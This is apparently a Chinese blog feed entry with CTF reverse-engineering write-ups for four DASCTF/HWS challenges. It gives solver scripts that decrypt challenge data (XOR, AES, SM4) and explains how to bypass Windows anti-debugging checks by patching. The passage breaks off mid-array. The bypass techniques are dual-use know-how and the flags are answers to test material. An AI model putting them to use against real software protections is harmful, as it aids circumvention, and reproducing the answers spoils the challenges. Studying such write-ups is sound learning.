alt="image-20210204222741818"></p><p>最后打开flag文件，是实体编码 entity code，用html写处一个标题让浏览器解析它。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/27/PXbVClN4UeKqJwj.png" alt="image-20210204223003807"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021一月DASCTF暨HWS硬件冬令营选拔赛</title>
      <link href="/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>二进制专场，总的来说题目难度不是很大，考点是好的，能学到东西。<a id="more"></a></p><p><img src="https://i.loli.net/2021/02/03/QS2rJ9EkmviR5Xy.png" alt="image-20210201212702456"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>拿了二血。逆向方向的签到题，直接穷举。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">18</span>,  <span class="number">69</span>,  <span class="number">16</span>,  <span class="number">71</span>,  <span class="number">25</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">26</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">28</span>,  <span class="number">30</span>,  <span class="number">82</span>, <span class="number">102</span>,  <span class="number">29</span>,  <span class="number">82</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">101</span>, <span class="number">111</span>,  <span class="number">95</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">94</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">163</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">int</span> v5 = j;</span><br><span class="line"><span class="keyword">int</span> v4 = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5);</span><br><span class="line">v5 ^= v4;</span><br><span class="line">v4 = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 );</span><br><span class="line"><span class="keyword">if</span>((v5 ^ <span class="number">0x23</span>) == enc[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>这个题，被从伪代码来辨识变量的值坑到了，还是要从汇编代码来看靠谱。</p><p>首先题目有一个混淆，但很简单，patch掉方便点，但不patch也不影响。</p><p><img src="https://i.loli.net/2021/02/03/WlwNj2E3zCGAt6u.png" alt="image-20210201220900210"></p><p>跟了挺久的加密过程，异或比较多，然后准备逆向的时候发现，AES的特征啊。开始以为是常规的aes的解密，但其实不然，加上题目几次异或对不熟悉aes加密来说迷惑性挺大的。</p><p>这样在这些加密函数徘徊了很久，不清楚这个aes到底要做什么。</p><p>最后看了看如果我们输入正确后要执行的函数，联想输入，加上这里函数少，识别起来相对容易些，发现就是使用我们输入当作key把密文进行AES解密。不确定的话还可以自己用数据执行这里的函数来测试一下。</p><p>由于这里的函数已经确定功能了，看看它们有没有在前面引用过，果然有的。这样就对我们分析前面起到了很大的帮助了。</p><p><img src="https://i.loli.net/2021/02/03/za8Ascqm9CWSEow.png" alt="image-20210201223206546"></p><p>这样后，再继续回到前面分析，总结一下流程：</p><p><img src="https://i.loli.net/2021/02/03/E1IKJlr5nMNxhU6.png" alt="image-20210201222517573"></p><p>解密过程：</p><p>把密文先异或一下，然后进行aes加密，其实是是多了个iv的CBC模式的AES加密，但这里只有一组。所以我直接ECB模式加密自己再异或一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'8ce51f9350f44511a854e1b5f0a3fbca'</span></span><br><span class="line">    key = bytes.fromhex(key)                     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        meg = cryptos.decrypt(decrpytBytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> meg.encode()</span><br><span class="line"></span><br><span class="line">plaint = <span class="string">'4ff5e148c1d81254533e3a4bd47cfe72'</span></span><br><span class="line">plaint = bytes.fromhex(plaint)</span><br><span class="line">a = AesEncry().encrypt(plaint)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>各种异或操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">198</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">231</span>, <span class="number">7</span>, </span><br><span class="line">  <span class="number">38</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op2[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">42</span>, <span class="number">253</span>, <span class="number">103</span>, <span class="number">31</span>, <span class="number">159</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">56</span>, </span><br><span class="line">  <span class="number">118</span>, <span class="number">164</span>, <span class="number">182</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">141</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mem[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">33</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">87</span>, <span class="number">165</span>, <span class="number">167</span>, <span class="number">67</span>, <span class="number">137</span>, </span><br><span class="line">  <span class="number">74</span>, <span class="number">14</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">31</span>, <span class="number">195</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">110</span>, <span class="number">214</span>, <span class="number">206</span>, <span class="number">97</span>, <span class="number">187</span>, <span class="number">143</span>, <span class="number">183</span>, <span class="number">243</span>, <span class="number">16</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">69</span>, <span class="number">158</span>, <span class="number">252</span>, <span class="number">225</span>, <span class="number">177</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">140</span>, <span class="number">229</span>, <span class="number">31</span>, <span class="number">147</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">168</span>, <span class="number">84</span>, </span><br><span class="line">  <span class="number">225</span>, <span class="number">181</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">251</span>, <span class="number">202</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor2[] = &#123;<span class="number">236</span>, <span class="number">251</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">249</span>, <span class="number">231</span>,</span><br><span class="line"> <span class="number">139</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">63</span>, <span class="number">80</span>, <span class="number">130</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">68</span>, <span class="number">43</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ans[] = &#123;<span class="number">192</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">127</span>, <span class="number">219</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">77</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">254</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">227</span>, <span class="number">85</span>, <span class="number">38</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mem[i] ^= xor1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">op1[i] ^= op2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] ^= xor2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#02x"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移位还原：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">16</span>] = &#123;<span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x73</span>, <span class="number">0xe</span>, <span class="number">0x86</span>, <span class="number">0x3c</span>, <span class="number">0xb4</span>, <span class="number">0x5f</span>,</span><br><span class="line"> <span class="number">0x8f</span>, <span class="number">0x87</span>, <span class="number">0xae</span>, <span class="number">0x91</span>, <span class="number">0xf7</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xd</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">15</span>] = (a[<span class="number">15</span>] &lt;&lt; <span class="number">3</span>) | ((a[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = (a[i] &lt;&lt; <span class="number">3</span>) | ((a[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>程序取出inp文件中的数据，然后进行加密后以hex形式存放入enc文件。</p><p>关键就是其中的一个反调试：</p><p><img src="https://i.loli.net/2021/02/03/QJ1RZLqFW6Axti7.png" alt="image-20210202194810695"></p><p>首先<strong>SetUnhandledExceptionFilter</strong>函数的作用：设置顶层未处理异常过滤器（top-level unhandled exception filter），捕获进程的各个线程中一切未被处理的结构化异常。简单来说就是修改系统最后的异常处理器。</p><p>然后触发<strong>SetUnhandledExceptionFilter</strong>的条件：</p><ul><li>程序中有异常，但没有相应的操作操作去处理该异常。</li><li>程序不处于调试状态。</li></ul><p><img src="https://i.loli.net/2021/02/03/qx619Tjh8yLIrHW.png" alt="image-20210202195228226"></p><p>满足条件后程序将执行设置的异常处理函数来处理该异常。</p><blockquote><p>而一般程序中要么把设置的异常处理函数用来检测程序是否处于调试状态；要么隐藏程序的关键代码，让我们执行不到。</p></blockquote><p>对于触发<strong>SetUnhandledExceptionFilter</strong>的条件，一般程序在调用<strong>SetUnhandledExceptionFilter</strong>后会有故意触发异常的代码，本题就是靠后面的执行无效指令进行触发。而程序是否处于调试状态其实是若出现的异常传递给了程序，程序先调用UnhandledExceptionFilter，而UnhandledExceptionFilter里面又调用了<strong>ZwQueryInformationProcess</strong>进行反调试检测，设置改函数的第二个参数为7，看执行完该函数后第三个参数指向的缓冲区是否为0，若不为0则程序处于调试状态，其实就是看有没有调试端口。</p><p>程序载入OD，设置忽略异常，ctrl+g，输入函数名字来到<strong>ZwQueryInformationProcess</strong>函数，然后下断。</p><p><img src="https://i.loli.net/2021/02/03/W1ubcV5jJ9lResL.png" alt="image-20210202202155455"></p><p>从栈窗口看到第2个参数为7，那就是要找的了，回溯到调用处，在函数执行完后将相应的缓存区的值改为0即可（若程序多次出现这种触发异常的跳转，那我们简单在执行完这个函数后hook一下程序方便些，本题的话直接把后面的je改为jmp就好了）。继续执行，就到了我们想执行的函数了。</p><p><img src="https://i.loli.net/2021/02/03/hT5x1sSw6Nlq7YJ.png" alt="image-20210202205950723"></p><p>而我做本题的时候并没有去过这个反调试，使用的附加调试，然后简单调试了下那个设置为异常处理的函数，发现后面还要触发异常就开始静态分析。</p><p>首先找到引用最后存放加密数据数组的地方：很明显它上下其实是代码的。</p><p><img src="https://i.loli.net/2021/02/03/9Lk3baYopKPJzem.png" alt="image-20210202203529519"></p><p>手动转化一下上面的数据为代码，加上之前调试了下设置异常处理函数，然后很容易发现，代码中有很多用来触发异常的数据（0x0c7, 0xff，且后面跟着2个或3这操作数）。</p><p>又在分析循环代码是发现循环计数器每次没有变，那岂不无限循环，从这里又进而发现，程序每次触发异常跳到设置的异常处理函数的目的：获取当前的eip，修改寄存器的值，修改eip。</p><p>各种opcode的功能：</p><p><img src="https://i.loli.net/2021/02/03/iTCalzSyQhYwrvV.png" alt="image-20210202204604400"></p><p><img src="https://i.loli.net/2021/02/03/fsUpTmPy41KqxXt.png" alt="image-20210202204621359"></p><p>剩下的把相应的触发异常的代码替换为实际的操作，因为加密不复杂，直接看汇编代码分析下就好了。</p><p>首先一个通过指定的index进行一个置换操作，然后典型的移位或加密，最后一个异或。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ind[<span class="number">50</span>], ans[<span class="number">50</span>], tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">147</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">104</span>, <span class="number">247</span>,</span><br><span class="line"> <span class="number">144</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">104</span>,</span><br><span class="line"> <span class="number">203</span>, <span class="number">25</span>, <span class="number">252</span>, <span class="number">248</span>, <span class="number">178</span>, <span class="number">107</span>, <span class="number">196</span>, <span class="number">171</span>, <span class="number">200</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"Bier"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp += <span class="number">0x11</span>;</span><br><span class="line">tmp &amp;= <span class="number">0x1f</span>;</span><br><span class="line">ind[i] = tmp;</span><br><span class="line"><span class="comment">//printf("%02x ", tmp);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= key[i&amp;<span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= enc[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">0</span>] = (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (enc[<span class="number">31</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] = (enc[i] &gt;&gt; <span class="number">3</span>) | (enc[i<span class="number">-1</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*for(i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%02x ", ans[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[ind[i+<span class="number">1</span>]] = ans[ind[i]];</span><br><span class="line">flag[ind[i]] = ans[ind[i+<span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</span></span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>拿了二血。</p><p>程序其实利用调用号hook了系统调用r3到r0的转接层，所以从下图中的v11函数指针其实是去执行出题人自己设置的函数。</p><p><img src="https://i.loli.net/2021/02/03/ofAZ4YKhuGjDcR8.png" alt="image-20210202211546712"></p><p>简单跟进行一下v11指向的函数：开始对字符解密得到模块和函数名，就是为了得到函数<strong>NtSetInformationThread</strong>来进行反调试。</p><p><img src="https://i.loli.net/2021/02/03/nph5lyftBDePWmZ.png" alt="image-20210202212312718"></p><p>对于这个反调试之前总结过：</p><p><img src="https://i.loli.net/2021/02/03/MxtYpIG8fNWUDyh.png" alt="image-20210202212558373"></p><p>这里要过它直接patch掉就好了。</p><p>然后就是一些加载dll和函数代码解密相关的操作，做题时节省时间没管，现在还是看看：</p><p><img src="https://i.loli.net/2021/02/03/KdMh8I6VLunaZJC.png" alt="image-20210202213212377"></p><p>使用资源查看工具，找到程序资源中改dll，明显看到是需要进行解密的，也就是后面的操作。</p><p><img src="https://i.loli.net/2021/02/03/t7HSrVNwjb9qZBJ.png" alt="image-20210202213458322"></p><p>继续跟进，看到解密操作只是一个异或：<br><img src="https://i.loli.net/2021/02/03/ysgJIf6lP5uRk1i.png" alt="image-20210202213645891"></p><p>至于后面的操作就是得到相关的函数地址等。</p><p>最后跟到最后的加密函数：字符串就提示了sm4密码，且长度是16，那这个就是key了。sm4密码从常量0xA3B1BAC6也可以识别出来。</p><p><img src="https://i.loli.net/2021/02/03/UFJ7TvwXNgWRxt4.png" alt="image-20210202214023629"></p><p>这里把32的input分2次加密的，每次16位。使用密文解密一下即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = bytes([<span class="number">234</span>,  <span class="number">99</span>,  <span class="number">88</span>, <span class="number">183</span>, <span class="number">140</span>, <span class="number">226</span>, <span class="number">161</span>, <span class="number">233</span>, <span class="number">197</span>,  <span class="number">41</span>, </span><br><span class="line">  <span class="number">143</span>,  <span class="number">83</span>, <span class="number">232</span>,   <span class="number">8</span>,  <span class="number">50</span>,  <span class="number">89</span>, <span class="number">175</span>,  <span class="number">27</span>, <span class="number">103</span>, <span class="number">174</span>, </span><br><span class="line">  <span class="number">217</span>, <span class="number">218</span>, <span class="number">207</span>, <span class="number">196</span>, <span class="number">114</span>, <span class="number">255</span>, <span class="number">177</span>, 